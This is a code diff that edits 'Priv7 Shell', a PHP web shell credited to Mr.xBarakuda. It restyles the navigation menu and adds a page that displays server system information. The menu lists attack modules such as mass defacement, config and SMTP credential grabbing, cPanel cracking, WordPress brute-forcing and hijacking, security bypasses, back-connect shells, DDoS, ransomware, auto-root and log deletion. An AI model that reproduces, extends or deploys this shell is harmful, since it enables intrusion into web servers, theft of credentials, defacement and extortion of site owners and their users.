@@ -1,4 +1,5 @@
 <?php
+<?php
 /*=================================*\
 #            Priv7 Shell            #
 #         Copyright © 2017          #
@@ -219,8 +220,6 @@ class BypassManager {
 }
 $bypassManager = new BypassManager();
 $bypassManager->runBypassChecks();
-?>
-<?php
 // Code by Mr.xBarakuda From All Indonesian Web Shell
 if (!file_exists('php.ini')) {
   $img = fopen('php.ini', 'w');
@@ -449,70 +448,68 @@ input[type=submit]:hover,button:hover{background:var(--accent2);transform:transl
   echo '<span>IP: <b style="color:var(--accent2)">' . $_SERVER['REMOTE_ADDR'] . '</b></span>';
   echo '<span>HDD: <b style="color:var(--accent2)">' . $used . ' / ' . $total . '</b></span>';
   echo '</div></div>';
-
   echo '<div class="nav">';
-  echo '  <a href="?">Home</a>';
-  echo "  <a href='?dir=$dir&do=upload'>Upload</a>";
-  echo "  <a href='?dir=$dir&do=command'>Command</a>";
-  echo "  <a href='?dir=$dir&do=mass_deface'>Mass Deface</a>";
-  echo "  <a href='?dir=$dir&do=xaivhost'>Vhost Config</a>";
-  echo "  <a href='?dir=$dir&do=configv2'>Config Grab</a>";
-  echo "  <a href='?dir=$dir&do=jumping'>Jumping</a>";
-  echo "  <a href='?dir=$dir&do=cpcrack'>CPanel Crack</a>";
-  echo "  <a href='?dir=$dir&do=smtp'>SMTP Grab</a>";
-  echo "  <a href='?dir=$dir&do=zoneh'>Zone-H</a>";
-  echo "  <a href='?dir=$dir&do=base64pict'>Base64 Img</a>";
-  echo "  <a href='?dir=$dir&do=spam_mail'>Mail Spammer</a>";
-  echo "  <a href='?dir=$dir&do=fake_root'>Fake Root</a>";
-  echo "  <a href='?dir=$dir&do=auto_edit_user'>Auto Edit User</a>";
-  echo "  <a href='?dir=$dir&do=wp_timthumb'>WP TimThumb</a>";
-  echo "  <a href='?dir=$dir&do=auto_wp'>WP Auto Edit</a>";
-  echo "  <a href='?dir=$dir&do=auto_dwp'>WP Auto Deface</a>";
-  echo "  <a href='?dir=$dir&do=auto_dwp2'>WP Deface V2</a>";
-  echo "  <a href='?dir=$dir&do=wpbf'>WP Bruteforce</a>";
-  echo "  <a href='?dir=$dir&do=hijack_wp'>WP Hijack</a>";
-  echo "  <a href='?dir=$dir&do=endecode'>EN/DEcoder</a>";
-  echo "  <a href='?dir=$dir&do=symlink'>Symlink</a>";
-  echo "  <a href='?dir=$dir&do=symconfv2'>Symlink V2</a>";
-  echo "  <a href='?dir=$dir&do=sympy'>Symlink Py</a>";
-  echo "  <a href='?dir=$dir&bypass=disablefunc'>Bypass DisableFunc</a>";
-  echo "  <a href='?dir=$dir&bypass=vhosts'>Bypass Vhost</a>";
-  echo "  <a href='?dir=$dir&bypass=etcpass'>Bypass /etc/passwd</a>";
-  echo "  <a href='?dir=$dir&bypass=cloudfl'>Bypass CloudFlare</a>";
-  echo "  <a href='?weevely'>Weevely</a>";
-  echo "  <a href='?dir=$dir&do=krdp_shell'>K-RDP Shell</a>";
-  echo "  <a href='?dir=$dir&do=ddos'>DDoS</a>";
-  echo "  <a href='?dir=$dir&do=domains'>Domains</a>";
-  echo "  <a href='?dir=$dir&do=ports'>Port Scanner</a>";
-  echo "  <a href='?dir=$dir&do=adminer'>Adminer</a>";
-  echo "  <a href='?dir=$dir&do=csrf'>CSRF</a>";
-  echo "  <a href='?dir=$dir&do=bctools'>Back Connect</a>";
-  echo "  <a href='?dir=$dir&do=hashgen'>Hash Gen</a>";
-  echo "  <a href='?dir=$dir&do=hashid'>Hash ID</a>";
-  echo "  <a href='?dir=$dir&do=honey'>Honeypot</a>";
-  echo "  <a href='?dir=$dir&do=zip_menu'>Zip Menu</a>";
-  echo "  <a href='?dir=$dir&do=infosec'>Server Info</a>";
-  echo "  <a href='?dir=$dir&do=phpinfo'>PHP Info</a>";
-  echo "  <a href='?dir=$dir&whmcs=killer'>WHMCS Killer</a>";
-  echo "  <a href='?dir=$dir&do=whmcsdeco'>WHMCS Decoder</a>";
-  echo "  <a href='?dir=$dir&do=dbdump'>DB Dump</a>";
-  echo "  <a href='?dir=$dir&do=vb_ngindex'>VB Index</a>";
-  echo "  <a href='?dir=$dir&do=reverse_ip'>Reverse IP</a>";
-  echo "  <a href='?dir=$dir&do=loghunter'>Log Hunter</a>";
-  echo "  <a href='?dir=$dir&do=cgitelnet'>CGI Telnet</a>";
-  echo "  <a href='?dir=$dir&do=kudascan'>Shell Scanner v1.1</a>";
-  echo "  <a href='?dir=$dir&do=shellscan'>Shell Scanner</a>";
-  echo "  <a href='?dir=$dir&do=drupalex'>Drupal Exploit</a>";
-  echo "  <a href='?dir=$dir&do=delogs'>Delete Logs</a>";
-  echo "  <a href='?dir=$dir&do=about'>About</a>";
-  echo "  <a href='?dir=$dir&do=w00t'>Auto Root</a>";
-  echo "  <a href='?dir=$dir&do=ransomware'>Ransomware</a>";
-  echo "  <a href='?dir=$dir&do=masschm'>Chmod Mass</a>";
-  echo "  <a href='?dir=$dir&do=r00t'>Simple Root</a>";
-  echo "  <a href='?dir=$dir&do=contact'>Contact</a>";
-
-  echo '</div>';
-
+  echo '<a href="?">Home</a>';
+  echo "<a href='?dir=$dir&do=upload'>Upload</a>";
+  echo "<a href='?dir=$dir&do=command'>Command</a>";
+  echo "<a href='?dir=$dir&do=mass_deface'>Mass Deface</a>";
+  echo "<a href='?dir=$dir&do=xaivhost'>Vhost Config</a>";
+  echo "<a href='?dir=$dir&do=configv2'>Config Grab</a>";
+  echo "<a href='?dir=$dir&do=jumping'>Jumping</a>";
+  echo "<a href='?dir=$dir&do=cpcrack'>CPanel Crack</a>";
+  echo "<a href='?dir=$dir&do=smtp'>SMTP Grab</a>";
+  echo "<a href='?dir=$dir&do=zoneh'>Zone-H</a>";
+  echo "<a href='?dir=$dir&do=base64pict'>Base64 Img</a>";
+  echo "<a href='?dir=$dir&do=spam_mail'>Mail Spammer</a>";
+  echo "<a href='?dir=$dir&do=fake_root'>Fake Root</a>";
+  echo "<a href='?dir=$dir&do=auto_edit_user'>Auto Edit User</a>";
+  echo "<a href='?dir=$dir&do=wp_timthumb'>WP TimThumb</a>";
+  echo "<a href='?dir=$dir&do=auto_wp'>WP Auto Edit</a>";
+  echo "<a href='?dir=$dir&do=auto_dwp'>WP Auto Deface</a>";
+  echo "<a href='?dir=$dir&do=auto_dwp2'>WP Deface V2</a>";
+  echo "<a href='?dir=$dir&do=wpbf'>WP Bruteforce</a>";
+  echo "<a href='?dir=$dir&do=hijack_wp'>WP Hijack</a>";
+  echo "<a href='?dir=$dir&do=endecode'>EN/DEcoder</a>";
+  echo "<a href='?dir=$dir&do=symlink'>Symlink</a>";
+  echo "<a href='?dir=$dir&do=symconfv2'>Symlink V2</a>";
+  echo "<a href='?dir=$dir&do=sympy'>Symlink Py</a>";
+  echo "<a href='?dir=$dir&bypass=disablefunc'>Bypass DisableFunc</a>";
+  echo "<a href='?dir=$dir&bypass=vhosts'>Bypass Vhost</a>";
+  echo "<a href='?dir=$dir&bypass=etcpass'>Bypass /etc/passwd</a>";
+  echo "<a href='?dir=$dir&bypass=cloudfl'>Bypass CloudFlare</a>";
+  echo "<a href='?weevely'>Weevely</a>";
+  echo "<a href='?dir=$dir&do=krdp_shell'>K-RDP Shell</a>";
+  echo "<a href='?dir=$dir&do=ddos'>DDoS</a>";
+  echo "<a href='?dir=$dir&do=domains'>Domains</a>";
+  echo "<a href='?dir=$dir&do=ports'>Port Scanner</a>";
+  echo "<a href='?dir=$dir&do=adminer'>Adminer</a>";
+  echo "<a href='?dir=$dir&do=csrf'>CSRF</a>";
+  echo "<a href='?dir=$dir&do=bctools'>Back Connect</a>";
+  echo "<a href='?dir=$dir&do=hashgen'>Hash Gen</a>";
+  echo "<a href='?dir=$dir&do=hashid'>Hash ID</a>";
+  echo "<a href='?dir=$dir&do=honey'>Honeypot</a>";
+  echo "<a href='?dir=$dir&do=zip_menu'>Zip Menu</a>";
+  echo "<a href='?dir=$dir&do=infosec'>Server Info</a>";
+  echo "<a href='?dir=$dir&do=phpinfo'>PHP Info</a>";
+  echo "<a href='?dir=$dir&whmcs=killer'>WHMCS Killer</a>";
+  echo "<a href='?dir=$dir&do=whmcsdeco'>WHMCS Decoder</a>";
+  echo "<a href='?dir=$dir&do=dbdump'>DB Dump</a>";
+  echo "<a href='?dir=$dir&do=vb_ngindex'>VB Index</a>";
+  echo "<a href='?dir=$dir&do=reverse_ip'>Reverse IP</a>";
+  echo "<a href='?dir=$dir&do=loghunter'>Log Hunter</a>";
+  echo "<a href='?dir=$dir&do=cgitelnet'>CGI Telnet</a>";
+  echo "<a href='?dir=$dir&do=kudascan'>Shell Scanner v1.1</a>";
+  echo "<a href='?dir=$dir&do=shellscan'>Shell Scanner</a>";
+  echo "<a href='?dir=$dir&do=drupalex'>Drupal Exploit</a>";
+  echo "<a href='?dir=$dir&do=delogs'>Delete Logs</a>";
+  echo "<a href='?dir=$dir&do=about'>About</a>";
+  echo "<a href='?dir=$dir&do=w00t'>Auto Root</a>";
+  echo "<a href='?dir=$dir&do=ransomware'>Ransomware</a>";
+  echo "<a href='?dir=$dir&do=masschm'>Chmod Mass</a>";
+  echo "<a href='?dir=$dir&do=r00t'>Simple Root</a>";
+  echo "<a href='?dir=$dir&do=contact'>Contact</a>";
+  echo "</div>";
+  echo "<div class='content'>";
   echo '<div class="breadcrumb">CWD: ';
   foreach ($scdir as $c_dir => $cdir) {
     echo '<a href="?dir=';
@@ -4524,4 +4521,25 @@ echo '</form></table></td></tr></center>';
   echo "<center>Copyright &copy; 2017 - ".date("Y")."<a href='https://www.google.com/search?q=intext:Mr.xBarakuda' target='_blank'><span style='color: deepskyblue;'> ".base64_decode($n4me)."</a></span><span style='color: red;'> &#9822;</span></center>";
 }
 echo "</body></html>";
-?>
+?>    <?php 
+    $output = ob_get_clean();
+    // If it's the home page (no output yet), show the sysinfo card
+    if (!isset($_GET['do']) && !isset($_GET['bypass']) && !isset($_GET['weevely']) && !isset($_GET['whmcs']) && empty(trim(strip_tags($output, '<table><tr><td><th>')))) {
+        echo '<div class="card"><h3>System Information</h3><div class="sinfo-grid">';
+        echo '<div class="item"><span class="label">Kernel:</span><span class="val">' . php_uname() . '</span></div>';
+        echo '<div class="item"><span class="label">IP Address:</span><span class="val">' . gethostbyname($_SERVER['HTTP_HOST']) . '</span></div>';
+        echo '<div class="item"><span class="label">Software:</span><span class="val">' . $_SERVER['SERVER_SOFTWARE'] . '</span></div>';
+        echo '<div class="item"><span class="label">Safe Mode:</span><span class="val">' . ((@ini_get(strtolower('safe_mode')) == 'on') ? 'ON' : 'OFF') . '</span></div>';
+        echo '</div></div>';
+    }
+    // Wrap the module output in a card if it exists
+    if (!empty(trim($output))) {
+        echo '<div class="card">' . $output . '</div>';
+    }
+    ?>
+  </div>
+  <div style="text-align: center; padding: 20px; color: #94a3b8; font-size: 12px;">
+    <p>Priv7 Shell © 2017 | Powered by Mr.xBarakuda</p>
+  </div>
+</body>
+</html>
